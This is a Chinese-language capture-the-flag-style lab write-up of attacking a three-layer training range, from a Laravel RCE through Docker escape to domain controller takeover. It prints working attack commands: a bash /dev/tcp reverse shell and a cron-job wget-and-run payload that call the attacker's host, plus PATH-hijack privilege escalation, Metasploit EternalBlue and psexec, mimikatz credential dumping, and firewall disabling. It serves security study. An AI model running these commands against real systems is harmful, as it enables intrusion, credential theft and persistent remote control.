## **前言：**

**内网是一个只有组织工作人员才能访问的专用网络，简而言之就是不可简单地通过外部公网ip进行访问到的公司内部网络。对于一个大型公司的网络系统，通过信息收集找到网站漏洞可以顺利通过公网进入公司内部网络时，进一步对公司内部网络的渗透攻击即为内网渗透。与外网渗透区别是外网渗透更侧重于找漏洞寻找突破口，考验的是渗透测试人员的综合能力，外网渗透的最终还是为了进入内网。而内网渗透更侧重于对目标的熟悉程度，内网相对于外网更为复杂，但是一旦让黑客进入到内网中很可能会造成数据泄露，勒索病毒，监听...事件的产生。此次分享给大家带来一篇由外网打点直到拿到内网域控主机控制权的全过程。**

##  **一.环境配置**

整个靶场环境一共五个靶机，分别位于三层网络环境中：

网络拓扑如下：![图片.png](https://image.3001.net/images/20220414/1649926322_6257e0b2905b0207ec294.png!small)

> DMZ区IP段为192.168.1.0/24
>
> 第二层网络环境IP段为192.168.52.1/24
>
> 第三层网络环境IP段为192.168.93.1/24

##  **二. Web打点**

首先我们拿到了目标的IP资产信息，为192.168.0.149，那么我们第一步要做的就是进行渗透测试前的信息收集。俗话说的好，信息收集的宽度决定了渗透测试的深度。于是我们直接拿出我们的大宝剑nmap先进行，目标IP的端口探针
Zenmap探针结果如下：

![图片.png](https://image.3001.net/images/20220414/1649926364_6257e0dccd92a25b44443.png!small)

通过ARL灯塔信息收集看看有什么成果。  
![图片.png](https://image.3001.net/images/20220414/1649926373_6257e0e5d19e9b23a72c2.png!small)

![图片.png](https://image.3001.net/images/20220414/1649926380_6257e0ecae47b5fb0c9fc.png!small)

最终发现目标192.168.0.149开放了22，80，81和6379端口，看到6379首先心里面想到了redis的未授权，想着是否存在未授权呢？

我们首先访问目标IP的81端口。

![图片.png](https://image.3001.net/images/20220414/1649926388_6257e0f4636b2114b96d4.png!small)

发现是个Laravel的站点，上百度查询发现官方给出的答案。

> Laravel是一套简洁、优雅的PHP Web开发框架(PHP Web
> Framework)。它可以让你从面条一样杂乱的代码中解脱出来；它可以帮你构建一个完美的网络APP，而且每行代码都可以简洁、富于表达力。  
> 在Laravel中已经具有了一套高级的PHP ActiveRecord实现 -- Eloquent
> ORM。它能方便的将“约束（constraints）”应用到关系的双方，这样你就具有了对数据的完全控制，而且享受到ActiveRecord的所有便利。Eloquent原生支持Fluent中查询构造器（query-> builder）的所有方法。

上网查了下Laravel爆出来的漏洞，发现也有很多，发现了CVE-2021-3129 Laravel Debug mode RCE漏洞
既然时RCE我们是否可以尝试用此漏洞直接拿到目标的webshell呢，具体漏洞分析文章看了下是Laravel自带的Ignition组存在反序列化漏洞，导致攻击者可以构造恶意请求触发Phar反序列化，造成远程代码执行。这里找到了一位师傅的一份exp，一键getshell。

![图片.png](https://image.3001.net/images/20220414/1649926397_6257e0fd185dc23487eb9.png!small)

##  **三：提权**

成功拿到了目标主机的webshell，通过蚁剑链接webshell。  
![图片.png](https://image.3001.net/images/20220414/1649926404_6257e104f160a391ced2a.png!small)

当打开虚拟终端时候返回的目标系统信息很不寻常，这时判断自己大概率拿下的仅仅是一个docker权限。  
![图片.png](https://image.3001.net/images/20220414/1649926416_6257e1103b934502519a5.png!small)

通过 cat /proc/self/cgroup 获取容器ID id获取当前用户权限。  
![图片.png](https://image.3001.net/images/20220414/1649926424_6257e1181fbf2599268c8.png!small)

现在拿到的docker权限都仅仅是个WWW权限，想要继续渗透必须得提权，那么LINUX提权方式有很多这里我给大家用环境变量提权。

我们查找具有SUID权限的文件。

find / -perm -u=s -type f 2>/dev/null

![图片.png](https://image.3001.net/images/20220414/1649926432_6257e120802a76d831e85.png!small)我们看到了一个shell文件，心想这样的名字肯定不是linux系统自带的，极大可能是运维人员留下来的，所以我们切到对应目录发现有一个demo.c文件猜想其编译完成就是我们的shell文件。  
![图片.png](https://image.3001.net/images/20220414/1649926445_6257e12de5cf0ebecd679.png!small)

对应的demo是一个ps的命令功能。  
![图片.png](https://image.3001.net/images/20220414/1649926453_6257e1359a6b5655bcd7d.png!small)

我么执行下shell发现正是ps功能。

![图片.png](https://image.3001.net/images/20220414/1649926465_6257e141937dc0d9b3d5a.png!small)

在demo.c中存在system函数，而system函数继承环境变量，可以通过替换环境变量可以达到执行任意命令。

在 tmp 目录（随便目录都可以）下创建一个ps文件。

cd /tmp  
echo "/bin/bash" > ps  
chmod 777 ps  
echo $PATH  
export PATH=/tmp:$PATH # 将/tmp添加到环境变量中，并且先加载执行/tmp里的程序  
cd /home/jobs  
./shell

但这里通过蚁剑去提权总是失败于是决定经shell反弹给我们的kali主机。

![图片.png](https://image.3001.net/images/20220414/1649926498_6257e1625b9dfc0d8c4cf.png!small)

kali收到会话：

![图片.png](https://image.3001.net/images/20220414/1649926504_6257e16885c89cee1df96.png!small)

再次进行提权环境变量中成功添加了tmp目录。

![图片.png](https://image.3001.net/images/20220414/1649926514_6257e172273f9ac9be02d.png!small)

这里我们成功拿到了目标主机的root权限。  
![图片.png](https://image.3001.net/images/20220414/1649926523_6257e17b6743d1a26f02b.png!small)

##  **四：docker逃逸：**

特权模式于版本0.6时被引入Docker，允许容器内的root拥有外部物理机root权限，而此前容器内root用户仅拥有外部物理机普通用户权限。使用特权模式启动容器，可以获取大量设备文件访问权限。因为当管理员执行docker
run
—privileged时，Docker容器将被允许访问主机上的所有设备，并可以执行mount命令进行挂载。当控制使用特权模式启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。

首先我们现在docker中新建一个/hacker目录用来挂在文件：

mkdir /hack

ls /dev看到/dev目录会发现很多设备文件，  
![图片.png](https://image.3001.net/images/20220414/1649926533_6257e1856405d9e99d253.png!small)

我们可以尝试将 /dev/sda1 挂载到/hack目录里：

mount /dev/sda1 /hacker

挂载完成切换到hacker目录我们做信息收集。  
![图片.png](https://image.3001.net/images/20220414/1649926542_6257e18e69d5b61175d51.png!small)

这里我把宿主机的会话反弹到我们的kali主机上，kali监听7777端口。

bash -c 'exec bash -i &>/dev/tcp/192.168.0.123/7777 <&1'  
![图片.png](https://image.3001.net/images/20220414/1649926585_6257e1b94fbe6bf2cd8c4.png!small)

这里我发现通过shell里面执行ifconfig命令不可以，所以心想着该用我们强大的后渗透工MSF了，输入下面命令。  
![图片.png](https://image.3001.net/images/20220414/1649926606_6257e1ce7ff0a0a725e3a.png!small)

MSF构建会话

use exploit/multi/script/web_delivery  
set target 7  
set payload linux/x64/meterpreter/reverse_tcp  
set lhost 192.168.0.123  
set lport 4444  
exploit  
![图片.png](https://image.3001.net/images/20220414/1649926661_6257e2057cb1385f22a49.png!small)

echo '* * * * * wget -qO TCeAmweH --no-check-certificate
http://192.168.0.123:8080/3gIlS0ed3rbQ3; chmod +x TCeAmweH; ./TCeAmweH&
disown' >> /hacker/var/spool/cron/crontabs/root

![图片.png](https://image.3001.net/images/20220414/1649926676_6257e214d5ddcd68adc47.png!small)

收集ip信息发现。

![图片.png](https://image.3001.net/images/20220414/1649926681_6257e219505540135dead.png!small)

发现我们的两个网段，但是1网段没有找到，再次查看拓扑图发现我们现在应该是直接到了第二台ubutun，那么为什么没有经过第一个直接到第二个呢，原来是目标网站是做了反向代理了，也就是说此时拿下的才是真正的Web服务器，前面那个仅仅是一台代理机。

![图片.png](https://image.3001.net/images/20220414/1649926695_6257e22730543df6e6cfe.png!small)

* * *

我们吹响进攻内网域控的号角，前面发现了另一个网段93，于是我们添加路由。

run post/multi/manage/autoroute  
run autoroute -p

![图片.png](https://image.3001.net/images/20220414/1649926702_6257e22e0ee7534159289.png!small)

之后添加代理：

use auxiliary/server/socks_proxy  
set SRVHOST 192.168.0.123  
set SRVPORT 5566  
exploit

![图片.png](https://image.3001.net/images/20220414/1649926709_6257e235d86b508aa5abd.png!small)

将nmap添加到sockscap中探针内网网段。  
![图片.png](https://image.3001.net/images/20220414/1649926724_6257e244a5fc5b422959a.png!small)

探针到我们52网段下抛去网关和广播地址不看有三台主机分别两台linux和一台windows主机。

![图片.png](https://image.3001.net/images/20220414/1649926732_6257e24ca4a72d8cd60d7.png!small)我们现在拿到的权限是192.168.52.20，看到192.168.52.10端口开放情况推断出应该是之前提到过的代理机所以我们把目标放在192.168.52.30。

![图片.png](https://image.3001.net/images/20220414/1649926739_6257e2534e3fc71e0b11f.png!small)

探针192.168.52.30的端口情况开放了88端口对应的是一个web页面。

![图片.png](https://image.3001.net/images/20220414/1649926745_6257e25926d466384e3ea.png!small)

![图片.png](https://image.3001.net/images/20220414/1649926757_6257e26540297840ac8a4.png!small)

是个通达OA，经测试其版本为通达OA
V11.3，该版本存在任意用户登录、文件包含和文件上传等多个漏洞所以我们有这样一个想发生成一个exe木马然后msf上传到现在的肉鸡，win7远程从肉鸡开启的http服务上将shell.exe下载下来执行。

但是这里我并没有选择这样去做因为我发现探测他的93网段发现了两台新主机93.30和93.40，而且有一台是windows7参考靶场文档有永恒之蓝漏洞，所以心想试试万一成功了就可以直接跳到下一网段，省去好多事，岂不美滋滋。  
![图片.png](https://image.3001.net/images/20220423/1650701454_6263b48e889abe2aacb63.png!small)

93.40是windows主机我们这里想是否存在永恒之蓝漏洞所以我们用msf尝试。

![图片.png](https://image.3001.net/images/20220501/1651374616_626dfa184510539631241.png!small)

use exploit/windows/smb/ms17_010_eternalblue  
set rhosts 192.168.93.40  
set payload windows/x64/meterpreter/bind_tcp  
set rhost 192.168.93.40  
set lport 4444  
exploit

![图片.png](https://image.3001.net/images/20220414/1649926779_6257e27b87cb0c5086139.png!small)

接着，我们使用meterpreter上的kiwi模块尝试抓取域用户及域管理员的密码：

load kiwi  
kiwi_cmd privilege::debug  
kiwi_cmd sekurlsa::logonPasswords

![图片.png](https://image.3001.net/images/20220414/1649926790_6257e2869a50af3793d54.png!small)

![图片.png](https://image.3001.net/images/20220414/1649926794_6257e28aeb5cd865104c7.png!small)

我们现在的攻击路径：

![图片.png](https://image.3001.net/images/20220414/1649926799_6257e28f0db65fcba5281.png!small)

发起总攻向域控。

先关闭其防火墙

net use \192.168.93.30\ipc$ "Whoami2021" /user:"Administrator"  
sc \192.168.93.30 create unablefirewall binpath= "netsh advfirewall set
allprofiles state off"  
sc \192.168.93.30 start unablefirewall

然后使用SMB协议横向拓展到域控主机

use exploit/windows/smb/psexec  
set payload windows/meterpreter/bind_tcp  
set rhost 192.168.93.30  
set smbuser administrator  
set smbpass Whoami2021  
exploit

![图片.png](https://image.3001.net/images/20220414/1649926813_6257e29dae546da061e26.png!small)

![图片.png](https://image.3001.net/images/20220414/1649926818_6257e2a2840aee7b896cf.png!small)

顺利拿下整个靶场，总体来说这套红日的靶场难度还是有的，从web打点--->docker提权---->docker逃逸---->信息收集----->永恒之蓝----->SMB横向拓展----->域控权限。打完之后收获很多，尤其对docker上的渗透测试有了新的认识，但并没有将靶场内的所有点都进行测试一遍，只是选了一条我认为最佳最有效的进攻路线，当拿到了域控权限可以dump整个hash也是一种变向拿到了所有主机的权限。文笔粗浅文中如有表达有误的地方，恳请各位师傅指教。

